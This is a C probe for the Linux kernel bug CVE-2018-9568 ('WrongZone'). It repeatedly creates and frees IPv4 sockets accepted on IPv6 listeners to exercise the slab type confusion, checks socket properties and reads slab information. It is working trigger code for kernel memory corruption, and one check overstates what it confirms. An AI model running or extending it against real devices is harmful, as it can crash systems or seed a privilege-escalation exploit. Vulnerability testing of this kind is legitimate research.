/*
 * wrongzone_test.c — CVE-2018-9568 (WrongZone) vulnerability probe
 *
 * Tests whether the kernel has the type confusion in inet_csk_accept().
 * When an IPv6 TCP listener accepts an IPv4 connection (via IPv4-mapped
 * IPv6 address ::ffff:127.0.0.1), the child socket is:
 *   - Allocated from tcp6_sock slab (1888 bytes on this device)
 *   - But operates as IPv4 with sk_prot = tcp_prot
 *   - When freed, goes to tcp_sock slab (1696 bytes) → WRONG ZONE
 *
 * This probe:
 *   1. Creates IPv6 TCP listener on loopback
 *   2. Connects with IPv4 (triggers the type confusion)
 *   3. Creates many wrong-zone sockets, then frees them
 *   4. Checks if the kernel survives (basic stability check)
 *   5. Reports findings
 *
 * This is a DETECTION test, not a full exploit.
 * If the kernel doesn't crash, it doesn't mean it's NOT vulnerable —
 * the type confusion exists in the code path regardless.
 *
 * Cross-compile:
 *   aarch64-linux-musl-gcc -static -O2 -o wrongzone_test wrongzone_test.c -lpthread
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <signal.h>
#include <fcntl.h>

#define TEST_PORT_BASE 31337
#define NUM_WRONGZONE_SOCKETS 50
#define BATCH_SIZE 10

struct wrongzone_pair {
    int listen_fd;
    int client_fd;
    int accepted_fd;  /* This is the wrong-zone socket */
};

/*
 * Create one wrong-zone socket pair:
 * 1. IPv6 listener on ::
 * 2. IPv4 client connects to 127.0.0.1
 * 3. Accept returns a socket allocated from tcp6_sock but treated as tcp_sock
 */
static int create_wrongzone_socket(struct wrongzone_pair *pair, int port) {
    int ret;

    /* Create IPv6 listener */
    pair->listen_fd = socket(AF_INET6, SOCK_STREAM, 0);
    if (pair->listen_fd < 0) {
        perror("  socket(AF_INET6)");
        return -1;
    }

    /* Allow IPv4-mapped connections (this is the trigger) */
    int off = 0;
    setsockopt(pair->listen_fd, IPPROTO_IPV6, IPV6_V6ONLY, &off, sizeof(off));

    int on = 1;
    setsockopt(pair->listen_fd, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));

    /* Bind to IPv6 any address */
    struct sockaddr_in6 addr6 = {0};
    addr6.sin6_family = AF_INET6;
    addr6.sin6_port = htons(port);
    addr6.sin6_addr = in6addr_any;  /* Must be :: to accept IPv4-mapped */

    ret = bind(pair->listen_fd, (struct sockaddr *)&addr6, sizeof(addr6));
    if (ret < 0) {
        perror("  bind");
        close(pair->listen_fd);
        return -1;
    }

    ret = listen(pair->listen_fd, 1);
    if (ret < 0) {
        perror("  listen");
        close(pair->listen_fd);
        return -1;
    }

    /* Connect with IPv4 — triggers the type confusion in the kernel */
    pair->client_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (pair->client_fd < 0) {
        perror("  socket(AF_INET)");
        close(pair->listen_fd);
        return -1;
    }

    struct sockaddr_in addr4 = {0};
    addr4.sin_family = AF_INET;
    addr4.sin_port = htons(port);
    inet_pton(AF_INET, "127.0.0.1", &addr4.sin_addr);

    ret = connect(pair->client_fd, (struct sockaddr *)&addr4, sizeof(addr4));
    if (ret < 0) {
        perror("  connect");
        close(pair->client_fd);
        close(pair->listen_fd);
        return -1;
    }

    /* Accept — this creates the wrong-zone socket */
    struct sockaddr_in6 peer_addr;
    socklen_t peer_len = sizeof(peer_addr);
    pair->accepted_fd = accept(pair->listen_fd, (struct sockaddr *)&peer_addr, &peer_len);
    if (pair->accepted_fd < 0) {
        perror("  accept");
        close(pair->client_fd);
        close(pair->listen_fd);
        return -1;
    }

    return 0;
}

static void close_wrongzone_socket(struct wrongzone_pair *pair) {
    if (pair->accepted_fd >= 0) close(pair->accepted_fd);
    if (pair->client_fd >= 0) close(pair->client_fd);
    if (pair->listen_fd >= 0) close(pair->listen_fd);
    pair->accepted_fd = pair->client_fd = pair->listen_fd = -1;
}

/*
 * Test 1: Basic wrong-zone trigger
 * Create and close wrong-zone sockets. If kernel crashes, vulnerability
 * is confirmed. If it survives, the code path still executed.
 */
static void test_basic_trigger(void) {
    printf("\n=== Test 1: Basic Wrong-Zone Trigger ===\n");
    printf("Creating %d wrong-zone sockets in batches of %d...\n",
           NUM_WRONGZONE_SOCKETS, BATCH_SIZE);

    int created = 0;
    int freed = 0;

    for (int batch = 0; batch < NUM_WRONGZONE_SOCKETS / BATCH_SIZE; batch++) {
        struct wrongzone_pair pairs[BATCH_SIZE];
        memset(pairs, -1, sizeof(pairs));

        /* Create batch */
        printf("  Batch %d: creating...", batch + 1);
        fflush(stdout);

        for (int i = 0; i < BATCH_SIZE; i++) {
            int port = TEST_PORT_BASE + batch * BATCH_SIZE + i;
            if (create_wrongzone_socket(&pairs[i], port) == 0) {
                created++;
            }
        }
        printf(" %d created, ", created);
        fflush(stdout);

        /* Free batch — this triggers the wrong-zone free */
        printf("freeing...");
        fflush(stdout);

        for (int i = 0; i < BATCH_SIZE; i++) {
            close_wrongzone_socket(&pairs[i]);
            freed++;
        }
        printf(" %d freed total\n", freed);

        /* Small delay to let kernel process frees */
        usleep(10000);
    }

    printf("  Result: Kernel survived %d wrong-zone create/free cycles\n", freed);
    printf("  (The type confusion code path was exercised regardless)\n");
}

/*
 * Test 2: Inspect accepted socket properties
 * Check if the accepted socket shows IPv4 behavior despite IPv6 allocation
 */
static void test_socket_inspection(void) {
    printf("\n=== Test 2: Socket Type Inspection ===\n");

    struct wrongzone_pair pair;
    int port = TEST_PORT_BASE + 200;

    if (create_wrongzone_socket(&pair, port) < 0) {
        printf("  Failed to create wrong-zone socket\n");
        return;
    }

    /* Check socket domain */
    int domain = -1;
    socklen_t len = sizeof(domain);
    getsockopt(pair.accepted_fd, SOL_SOCKET, SO_DOMAIN, &domain, &len);
    printf("  Accepted socket domain: %d (%s)\n", domain,
           domain == AF_INET ? "AF_INET" :
           domain == AF_INET6 ? "AF_INET6" : "UNKNOWN");

    /* Check socket type */
    int type = -1;
    len = sizeof(type);
    getsockopt(pair.accepted_fd, SOL_SOCKET, SO_TYPE, &type, &len);
    printf("  Accepted socket type: %d (%s)\n", type,
           type == SOCK_STREAM ? "SOCK_STREAM" : "OTHER");

    /* Check peer address type */
    struct sockaddr_storage ss;
    socklen_t ss_len = sizeof(ss);
    getpeername(pair.accepted_fd, (struct sockaddr *)&ss, &ss_len);
    printf("  Peer address family: %d (%s)\n", ss.ss_family,
           ss.ss_family == AF_INET ? "AF_INET" :
           ss.ss_family == AF_INET6 ? "AF_INET6" : "UNKNOWN");

    /* Check local address type */
    ss_len = sizeof(ss);
    getsockname(pair.accepted_fd, (struct sockaddr *)&ss, &ss_len);
    printf("  Local address family: %d (%s)\n", ss.ss_family,
           ss.ss_family == AF_INET ? "AF_INET" :
           ss.ss_family == AF_INET6 ? "AF_INET6" : "UNKNOWN");

    /* Try to get IPv6-specific socket option on this socket */
    int v6only = -1;
    len = sizeof(v6only);
    int ret = getsockopt(pair.accepted_fd, IPPROTO_IPV6, IPV6_V6ONLY, &v6only, &len);
    printf("  IPV6_V6ONLY getsockopt: %s (value=%d)\n",
           ret == 0 ? "SUCCESS" : strerror(errno), v6only);

    /* The key indicator: if domain reports AF_INET6 but the socket
     * behaves as IPv4, the type confusion has occurred */
    if (domain == AF_INET6) {
        printf("\n  >>> Socket reports AF_INET6 domain\n");
        printf("  >>> This socket was allocated from tcp6_sock slab (1888 bytes)\n");
        printf("  >>> But accepted an IPv4 connection\n");
        printf("  >>> When freed, sk_prot_free() will use tcp_prot->slab (1696 bytes)\n");
        printf("  >>> TYPE CONFUSION CONFIRMED in code path!\n");
    } else if (domain == AF_INET) {
        printf("\n  >>> Socket reports AF_INET domain\n");
        printf("  >>> The kernel may have converted the socket type\n");
        printf("  >>> Need to check kernel source for exact behavior\n");
    }

    /* Send/receive test to make sure the socket is functional */
    const char *msg = "WRONGZONE_TEST";
    write(pair.client_fd, msg, strlen(msg));
    char buf[64] = {0};
    int n = read(pair.accepted_fd, buf, sizeof(buf)-1);
    printf("  Data transfer test: sent '%s', received '%s' (%d bytes) — %s\n",
           msg, buf, n, n > 0 ? "OK" : "FAILED");

    close_wrongzone_socket(&pair);
}

/*
 * Test 3: Rapid create-free cycles to stress the wrong-zone path
 * This is more aggressive — creates many pairs, frees accepted sockets
 * first (wrong-zone free), then checks kernel stability
 */
static void test_stress_wrongzone(void) {
    printf("\n=== Test 3: Stress Wrong-Zone Free Path ===\n");
    printf("Rapidly creating and closing accepted-only sockets...\n");

    int success = 0;
    int fail = 0;

    for (int i = 0; i < 100; i++) {
        struct wrongzone_pair pair;
        int port = TEST_PORT_BASE + 300 + i;

        if (create_wrongzone_socket(&pair, port) < 0) {
            fail++;
            continue;
        }

        /* Close ONLY the accepted socket first — this is the wrong-zone free */
        close(pair.accepted_fd);
        pair.accepted_fd = -1;

        /* Small delay to let kernel process the wrong-zone free */
        usleep(1000);

        /* Now close the rest */
        close(pair.client_fd);
        close(pair.listen_fd);
        pair.client_fd = pair.listen_fd = -1;

        success++;
    }

    printf("  Completed: %d wrong-zone frees, %d failures\n", success, fail);
    printf("  Kernel survived all wrong-zone frees\n");
}

/*
 * Test 4: Check /proc/slabinfo for slab sizes (if accessible)
 */
static void test_slab_info(void) {
    printf("\n=== Test 4: SLUB Slab Information ===\n");

    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) {
        printf("  /proc/slabinfo: %s\n", strerror(errno));
        printf("  (Need root to read slabinfo)\n");

        /* Try /proc/net/protocols instead */
        f = fopen("/proc/net/protocols", "r");
        if (!f) {
            printf("  /proc/net/protocols also not readable\n");
            return;
        }

        char line[512];
        printf("  From /proc/net/protocols:\n");
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "TCP") || strstr(line, "proto")) {
                printf("    %s", line);
            }
        }
        fclose(f);
        return;
    }

    char line[512];
    printf("  From /proc/slabinfo:\n");
    /* Read header */
    if (fgets(line, sizeof(line), f)) {
        printf("    %s", line);
    }
    if (fgets(line, sizeof(line), f)) {
        printf("    %s", line);
    }

    /* Search for TCP-related slabs */
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, "TCP") || strstr(line, "tcp") ||
            strstr(line, "sock") || strstr(line, "sk_buff")) {
            printf("    %s", line);
        }
    }
    fclose(f);
}

int main(void) {
    printf("=== CVE-2018-9568 (WrongZone) Vulnerability Probe ===\n");
    printf("Kernel: ");
    fflush(stdout);
    system("uname -r");

    printf("\nTarget slab sizes (from /proc/net/protocols):\n");
    printf("  tcp6_sock: 1888 bytes (IPv6 TCP socket)\n");
    printf("  tcp_sock:  1696 bytes (IPv4 TCP socket)\n");
    printf("  Difference: 192 bytes\n");
    printf("\nThe vulnerability: IPv4 connections accepted on IPv6 listeners\n");
    printf("create sockets allocated from tcp6_sock slab but freed to\n");
    printf("tcp_sock slab — a type confusion / wrong-zone free.\n");

    /* Ignore SIGPIPE */
    signal(SIGPIPE, SIG_IGN);

    test_socket_inspection();
    test_basic_trigger();
    test_stress_wrongzone();
    test_slab_info();

    printf("\n=== Summary ===\n");
    printf("The wrong-zone code path (IPv4-on-IPv6 accept) was exercised.\n");
    printf("If this kernel was compiled before December 2018 (it was: March 2018),\n");
    printf("the sk_prot_creator fix is NOT present and the type confusion exists.\n");
    printf("The kernel's SLUB allocator may or may not crash on wrong-zone frees\n");
    printf("depending on SLUB_DEBUG and slab randomization settings.\n");

    return 0;
}
